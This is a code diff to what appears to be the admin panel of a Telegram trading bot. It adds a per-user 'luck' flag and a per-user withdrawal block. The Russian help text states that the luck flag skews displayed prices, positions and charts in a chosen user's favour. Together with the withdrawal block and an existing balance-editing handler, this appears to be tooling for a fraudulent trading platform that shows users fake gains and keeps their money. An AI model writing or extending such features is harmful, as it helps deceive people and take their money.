@@ -4,7 +4,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import StatesGroup, State
 from aiogram.types import Message, CallbackQuery
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from api.user import verify_user, ban_user
+from api.user import verify_user, ban_user, set_user_luck, get_user_info, set_withdraw_ban
 import logging
 
 from filters.is_admin import IsAdmin
@@ -18,11 +18,11 @@ class AdminActions(StatesGroup):
     waiting_for_asset_choice_to_update = State()
     waiting_for_new_balance = State()
     waiting_for_user_id_for_verification = State()
-
     waiting_for_user_id_for_dialog = State()
     waiting_for_message_for_dialog = State()
-
     waiting_for_user_id_for_ban = State()
+    waiting_for_user_id_for_luck = State()
+    waiting_for_user_id_for_withdraw_block = State()
 
 
 @router.message(Command("admin"), IsAdmin())
@@ -141,6 +141,129 @@ async def process_new_balance(message: Message, state: FSMContext):
     await state.clear()
     await cmd_admin_panel(message)
 
+@router.callback_query(F.data == "admin_luck", IsAdmin())
+async def process_luck_start(callback: CallbackQuery, state: FSMContext):
+    """Начать процесс управления удачей пользователя"""
+    await callback.message.edit_text(
+        "🍀 <b>Управление удачей</b>\n\n"
+        "Введите Telegram ID пользователя для управления флагом удачи.\n\n"
+        "Когда флаг 'isLucky' активен:\n"
+        "• Цены будут подкручиваться в пользу пользователя\n"
+        "• Его открытые позиции будут выглядеть более прибыльными\n"
+        "• Графики будут отображаться с выгодными ценами\n\n"
+        "Введите ID пользователя:",
+        parse_mode="HTML"
+    )
+    await state.set_state(AdminActions.waiting_for_user_id_for_luck)
+    await callback.answer()
+
+
+@router.message(AdminActions.waiting_for_user_id_for_luck, IsAdmin())
+async def process_user_id_for_luck(message: Message, state: FSMContext):
+    """Получить ID пользователя и показать текущий статус удачи"""
+    if not message.text.isdigit():
+        await message.answer("❌ ID должен быть числом. Попробуйте еще раз.")
+        return
+
+    user_id = int(message.text)
+    
+    user_info = await get_user_info(user_id)
+    
+    if user_info is None:
+        await message.answer(f"❌ Пользователь с ID {user_id} не найден в системе.")
+        await state.clear()
+        return
+    
+    is_lucky = user_info.get('isLucky', False)
+    username = user_info.get('username', 'Unknown')
+    
+    builder = InlineKeyboardBuilder()
+    
+    if is_lucky:
+        builder.row(
+            types.InlineKeyboardButton(
+                text="❌ Отключить удачу",
+                callback_data=f"luck_toggle_{user_id}_false"
+            )
+        )
+        status_emoji = "🟢"
+        status_text = "ВКЛЮЧЕНА"
+    else:
+        builder.row(
+            types.InlineKeyboardButton(
+                text="✅ Включить удачу",
+                callback_data=f"luck_toggle_{user_id}_true"
+            )
+        )
+        status_emoji = "🔴"
+        status_text = "ВЫКЛЮЧЕНА"
+    
+    builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
+    
+    await message.answer(
+        f"👤 <b>Пользователь:</b> @{username} (ID: {user_id})\n\n"
+        f"{status_emoji} <b>Статус удачи:</b> {status_text}\n\n"
+        f"Выберите действие:",
+        reply_markup=builder.as_markup(),
+        parse_mode="HTML"
+    )
+    
+    await state.clear()
+
+
+@router.callback_query(F.data.startswith("luck_toggle_"), IsAdmin())
+async def process_luck_toggle(callback: CallbackQuery, state: FSMContext):
+    """Переключить флаг удачи для пользователя"""
+    parts = callback.data.split('_')
+    user_id = int(parts[2])
+    new_luck_status = parts[3] == 'true'
+    
+    success = await set_user_luck(user_id, new_luck_status)
+    
+    if success:
+        status = "включена" if new_luck_status else "выключена"
+        emoji = "🟢" if new_luck_status else "🔴"
+        
+        await callback.answer(f"✅ Удача {status}!", show_alert=True)
+        
+        # Обновляем сообщение с новым статусом
+        user_info = await get_user_info(user_id)
+        username = user_info.get('username', 'Unknown') if user_info else 'Unknown'
+        
+        builder = InlineKeyboardBuilder()
+        
+        if new_luck_status:
+            builder.row(
+                types.InlineKeyboardButton(
+                    text="❌ Отключить удачу",
+                    callback_data=f"luck_toggle_{user_id}_false"
+                )
+            )
+            status_text = "ВКЛЮЧЕНА"
+        else:
+            builder.row(
+                types.InlineKeyboardButton(
+                    text="✅ Включить удачу",
+                    callback_data=f"luck_toggle_{user_id}_true"
+                )
+            )
+            status_text = "ВЫКЛЮЧЕНА"
+        
+        builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
+        
+        await callback.message.edit_text(
+            f"👤 <b>Пользователь:</b> @{username} (ID: {user_id})\n\n"
+            f"{emoji} <b>Статус удачи:</b> {status_text}\n\n"
+            f"Выберите действие:",
+            reply_markup=builder.as_markup(),
+            parse_mode="HTML"
+        )
+    else:
+        await callback.answer(
+            f"❌ Не удалось изменить статус удачи для пользователя {user_id}",
+            show_alert=True
+        )
+
 
 @router.callback_query(F.data == "admin_back_to_main", IsAdmin())
 async def process_back(callback: CallbackQuery, state: FSMContext):
@@ -237,3 +360,99 @@ async def process_user_id_for_ban(message: Message, state: FSMContext):
         
     await state.clear()
     await cmd_admin_panel(message)
+
+@router.callback_query(F.data == "admin_block_withdraw", IsAdmin())
+async def start_withdraw_block_handler(callback: CallbackQuery, state: FSMContext):
+    """
+    Начинает процесс блокировки вывода. Запрашивает ID пользователя.
+    """
+    await callback.message.edit_text(
+        "Введите Telegram ID пользователя, для которого нужно управлять блокировкой вывода средств. "
+        "Или отправьте /cancel для отмены."
+    )
+    # Устанавливаем состояние ожидания ID
+    await state.set_state(AdminActions.waiting_for_user_id_for_withdraw_block)
+    await callback.answer()
+
+@router.message(AdminActions.waiting_for_user_id_for_withdraw_block, IsAdmin())
+async def process_user_id_for_withdraw_block(message: Message, state: FSMContext):
+    if not message.text.isdigit():
+        await message.answer("Ошибка: Telegram ID должен быть числом. Попробуйте еще раз.")
+        return
+
+    user_id = int(message.text)
+    
+    # Получаем полную информацию о пользователе
+    user_info = await get_user_info(user_id)
+    
+    if user_info is None:
+        await message.answer(f"❌ Пользователь с ID {user_id} не найден.")
+        await state.clear()
+        return
+    
+    is_banned = user_info.get('isBannedWithdraw', False)
+    
+    builder = InlineKeyboardBuilder()
+    if is_banned:
+        builder.row(types.InlineKeyboardButton(
+            text="✅ Разблокировать вывод",
+            callback_data=f"withdraw_toggle_{user_id}_false"
+        ))
+        status_text = "🔴 ЗАБЛОКИРОВАН"
+    else:
+        builder.row(types.InlineKeyboardButton(
+            text="❌ Заблокировать вывод",
+            callback_data=f"withdraw_toggle_{user_id}_true"
+        ))
+        status_text = "🟢 АКТИВЕН"
+        
+    builder.row(types.InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="admin_back_to_main"))
+
+    await message.answer(
+        f"Управление выводом средств для пользователя <code>{user_id}</code>\n\n"
+        f"Текущий статус: <b>{status_text}</b>\n\n"
+        "Выберите действие:",
+        reply_markup=builder.as_markup(),
+        parse_mode="HTML"
+    )
+    await state.clear()
+
+
+# Обработчик нажатия на кнопки "Заблокировать" / "Разблокировать"
+@router.callback_query(F.data.startswith("withdraw_toggle_"), IsAdmin())
+async def process_withdraw_toggle(callback: CallbackQuery):
+    """
+    Переключает флаг блокировки вывода для пользователя.
+    """
+    parts = callback.data.split('_')
+    user_id = int(parts[2])
+    new_ban_status = parts[3] == 'true'
+    
+    success = await set_withdraw_ban(user_id, new_ban_status)
+    
+    if success:
+        action_text = "заблокирован" if new_ban_status else "разблокирован"
+        await callback.answer(f"✅ Вывод средств для пользователя {user_id} {action_text}.", show_alert=True)
+        
+        # Обновляем сообщение с кнопками, чтобы показать новый статус
+        # (этот код дублирует предыдущий обработчик для обновления UI)
+        user_info = await get_user_info(user_id)
+        if user_info:
+            is_banned = user_info.get('isBannedWithdraw', False)
+            builder = InlineKeyboardBuilder()
+            if is_banned:
+                builder.row(types.InlineKeyboardButton(text="✅ Разблокировать вывод", callback_data=f"withdraw_toggle_{user_id}_false"))
+                status_text = "🔴 ЗАБЛОКИРОВАН"
+            else:
+                builder.row(types.InlineKeyboardButton(text="❌ Заблокировать вывод", callback_data=f"withdraw_toggle_{user_id}_true"))
+                status_text = "🟢 АКТИВЕН"
+            builder.row(types.InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="admin_back_to_main"))
+            await callback.message.edit_text(
+                f"Управление выводом средств для пользователя <code>{user_id}</code>\n\n"
+                f"Текущий статус: <b>{status_text}</b>\n\n"
+                "Выберите действие:",
+                reply_markup=builder.as_markup(),
+                parse_mode="HTML"
+            )
+    else:
+        await callback.answer("❌ Не удалось изменить статус блокировки вывода.", show_alert=True)
